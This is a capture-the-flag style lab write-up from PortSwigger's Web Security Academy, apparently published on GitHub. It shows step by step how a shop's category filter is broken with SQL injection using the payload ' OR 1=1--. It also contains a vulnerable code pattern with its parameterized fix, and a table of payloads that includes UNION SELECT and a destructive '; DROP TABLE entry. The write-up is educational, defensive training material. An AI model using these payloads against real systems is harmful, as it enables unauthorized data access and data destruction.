# Lab 1: SQL Injection Vulnerability in WHERE Clause

## Executive Summary

This lab demonstrates a fundamental SQL injection vulnerability in a product filtering mechanism where user-supplied category parameters are directly incorporated into SQL WHERE clauses without sanitization. Through systematic testing of SQL syntax and logic manipulation, I identified the vulnerability, confirmed database query structure, and successfully bypassed access controls to retrieve hidden products. By injecting the payload `' OR 1=1--`, I forced the query to return all database records regardless of category restrictions, exposing sensitive data not intended for public access.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | SQL Injection |
| **Difficulty**         | Apprentice |
| **Vulnerability**      | SQL Injection in WHERE Clause |
| **Risk**               | High - Unauthorized Data Access |
| **Completion**         | February 1, 2026 |

## Objective

Exploit SQL injection in the product category filter to bypass access controls and retrieve hidden products from the database by manipulating the WHERE clause logic.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Repeater for payload testing
- Browser for verification

**Target:** Product filtering functionality using category parameter

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed the lab environment and navigated to the shopping page to analyze application functionality and request structure.
<img width="1920" height="982" alt="LAB1-ss1" src="https://github.com/user-attachments/assets/ff8d2f39-0671-425b-a7d6-3edddac048d0" />

*Shopping page showing product categories (right) | HTTP requests captured in Burp Suite (left)*

**Available Categories:**
- All
- Clothing
- Shoes & Accessories
- Corporate Gifts
- Lifestyle
- Pens

**Request Captured:**
```http
GET /filter?category=Corporate+gifts HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**URL Parameter Analysis:**
```
/filter?category=Corporate+gifts
```

**Backend Query Structure (Inferred):**
```sql
SELECT * FROM products WHERE category = 'Corporate gifts'
```

**Initial Observation:** The `category` parameter directly filters products, suggesting it's incorporated into an SQL WHERE clause.
<img width="1920" height="982" alt="LAB1_ss1 1" src="https://github.com/user-attachments/assets/9c7bee4d-8d76-4ced-a4e0-e6449b748ff6" />

*"All" category showing 12 products total*

**Baseline Established:** 12 products visible when viewing all categories.

### 2. Parameter Manipulation Testing

Sent the request to Burp Repeater to test parameter behavior and confirm SQL query interaction.

**Test Payload:** Modified category to non-existent value
```http
GET /filter?category=Pets HTTP/1.1
```

<img width="1920" height="982" alt="LAB1_ss2" src="https://github.com/user-attachments/assets/a03ea5cb-b7dc-470d-9c71-ef481a9e24a5" />

*Category changed to "Pets" in Repeater (left) | URL showing category=Pets in browser (right)*

**Response:** 200 OK with empty product list

**Analysis:** Application accepts arbitrary category values and filters accordingly, confirming direct parameter usage in SQL query without server-side validation.

### 3. SQL Injection Vulnerability Discovery

**Attack Hypothesis:** If the category parameter is directly concatenated into SQL queries, injecting SQL metacharacters should cause syntax errors.

**Test Payload:** Single quote character
```http
GET /filter?category=' HTTP/1.1
```
<img width="1920" height="982" alt="LAB1_ss3" src="https://github.com/user-attachments/assets/fb7df5e5-4228-4bff-8481-146077c07aee" />

*Single quote injection causing Internal Server Error in Repeater*

**Response:** 500 Internal Server Error

**Resulting SQL Query (Broken):**
```sql
SELECT * FROM products WHERE category = '''
```

**Vulnerability Confirmed:** The single quote breaks the SQL syntax, causing a database error. This proves:
1. User input is directly inserted into SQL queries
2. No input sanitization or parameterization exists
3. SQL injection is possible

### 4. Comment Syntax Verification

**Test Payload:** SQL comment sequence
```http
GET /filter?category=-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB1_ss4" src="https://github.com/user-attachments/assets/bd322b40-07aa-490c-a9df-2c335b53eb11" />

*Comment injection test - Empty response confirms SQL comment syntax works*

**Response:** 200 OK with no products

**Resulting SQL Query:**
```sql
SELECT * FROM products WHERE category = '--'
-- Everything after this is commented out
```

**Analysis:** The `--` comment syntax is accepted, confirming SQL command injection capability and allowing us to comment out remaining query portions.

### 5. Logic Manipulation Attack

**Attack Payload:** Boolean-based SQL injection
```http
GET /filter?category=' OR 1=1-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB1_ss5" src="https://github.com/user-attachments/assets/67a7f710-3f75-41b9-a6fc-b8186eb98405" />

*Boolean injection successful - 200 OK in Repeater (left) | All hidden products exposed including lab completion (right)*

**Resulting SQL Query:**
```sql
SELECT * FROM products WHERE category = '' OR 1=1--'
```

**Query Logic Breakdown:**
```sql
WHERE category = ''    -- Always false (no category named '')
OR 1=1                 -- Always true (universal condition)
--'                    -- Comments out the closing quote
```

**Result:** Since `1=1` is always true, the WHERE clause evaluates to true for all records, bypassing the category filter entirely.

**Response:** 200 OK with all products including previously hidden items

**Attack Success:**
- ✅ Category filter bypassed
- ✅ Hidden products revealed
- ✅ All database records retrieved
- ✅ Access control circumvented

**Lab completion confirmed: Hidden products now visible**

### 6. Impact Verification

Zoomed browser view to demonstrate the full extent of unauthorized data access.

<img width="1920" height="982" alt="LAB1_ss6" src="https://github.com/user-attachments/assets/d396a691-1a66-4661-9d38-6986e1c1e342" />
*Before: 12 products visible | After: 20 products visible - 8 hidden products exposed*

**Evidence of Exploitation:**
- **Original Product Count:** 12 products
- **After Injection:** 20 products
- **Hidden Products Exposed:** 8 products
- **URL Proof:** `category=' OR 1=1--` visible in address bar

**Data Exposure Impact:**
- Hidden inventory revealed
- Unreleased products visible
- Private/test products accessible
- Potential pricing information leaked

## Technical Impact

**Severity: High (CVSS 7.5)**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
```

**Primary Vulnerability:**

**CWE-89: SQL Injection**
- User input directly concatenated into SQL queries
- No input validation or sanitization
- No parameterized queries or prepared statements
- SQL metacharacters processed as code

**Vulnerable Code Pattern:**
```python
# VULNERABLE CODE
category = request.GET['category']
query = "SELECT * FROM products WHERE category = '" + category + "'"
results = database.execute(query)
```

**Exploitation Mechanics:**

**Normal Query:**
```sql
Input: Corporate+gifts
Query: SELECT * FROM products WHERE category = 'Corporate gifts'
Result: Products in Corporate gifts category
```

**Injected Query:**
```sql
Input: ' OR 1=1--
Query: SELECT * FROM products WHERE category = '' OR 1=1--'
Result: ALL products (WHERE clause always true)
```

**Attack Progression:**
```
User Input: category=' OR 1=1--
        ↓
Direct String Concatenation
        ↓
Modified SQL Query
        ↓
WHERE category = '' OR 1=1--'
        ↓
Logical Evaluation: FALSE OR TRUE
        ↓
Result: TRUE (all records)
        ↓
Hidden Products Exposed
```

**Real-World Impact:**

| Scenario | Consequence |
|----------|-------------|
| **E-Commerce** | Hidden products, pricing, inventory exposure |
| **Healthcare** | Patient records, medical data disclosure |
| **Financial** | Account information, transaction data leakage |
| **Corporate** | Confidential documents, employee data access |
| **Government** | Classified information, citizen data exposure |

**Escalation Potential:**

This basic injection demonstrates read access, but can escalate to:
- **UNION-based injection:** Extract data from other tables
- **Blind SQL injection:** Infer data through boolean/time-based queries
- **Stacked queries:** Execute multiple SQL statements
- **Database fingerprinting:** Identify database type and version
- **Administrative access:** Potentially access user credentials or admin functions

## Key Takeaways

**Penetration Testing Methodology:**
- Systematic parameter manipulation testing
- SQL syntax error analysis
- Comment injection verification
- Boolean logic manipulation
- Impact assessment through data comparison

**Critical Security Insights:**

**1. Never Trust User Input:**
All user-supplied data must be treated as potentially malicious:
- Input validation alone is insufficient
- Special characters must be properly handled
- Assume all input is hostile

**2. Use Parameterized Queries:**
Modern database interfaces provide safe query construction:
- Prepared statements separate code from data
- Database handles escaping automatically
- Prevents all SQL injection attacks

**Secure Implementation:**
```python
# SECURE CODE - Parameterized Query
category = request.GET['category']
query = "SELECT * FROM products WHERE category = ?"
results = database.execute(query, [category])
```

**3. Defense-in-Depth:**
Multiple security layers provide comprehensive protection:
- Input validation (whitelist expected values)
- Parameterized queries (prevent injection)
- Least privilege (limit database permissions)
- WAF rules (detect injection attempts)
- Error handling (don't expose SQL errors)

**4. Common SQL Injection Patterns:**

| Payload | Purpose | Effect |
|---------|---------|--------|
| `'` | Syntax test | Breaks query, causes error |
| `--` | Comment | Ignores remaining query |
| `' OR 1=1--` | Logic bypass | Returns all records |
| `' UNION SELECT` | Data extraction | Combines queries |
| `'; DROP TABLE` | Destructive | Deletes data (if stacked queries enabled) |

**5. Detection and Prevention:**

**Application-Level:**
- Parameterized queries mandatory
- Input validation with whitelists
- Least privilege database accounts
- Remove detailed error messages in production

**Network-Level:**
- Web Application Firewall (WAF)
- Intrusion Detection Systems (IDS)
- Database activity monitoring
- Regular security audits

**Professional Skills Demonstrated:**
- SQL injection identification and exploitation
- Systematic vulnerability testing methodology
- Understanding of database query structure
- Boolean logic manipulation
- Impact assessment and documentation

## References

1. PortSwigger Web Security Academy - SQL Injection
2. OWASP Top 10 (2021) - A03: Injection
3. CWE-89 - SQL Injection
4. OWASP SQL Injection Prevention Cheat Sheet
5. NIST SP 800-53 - Security Controls for Information Systems

---

## Legal Notice

**Copyright © 2025 Gurpreet Singh**  
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to systems is illegal under applicable laws worldwide.
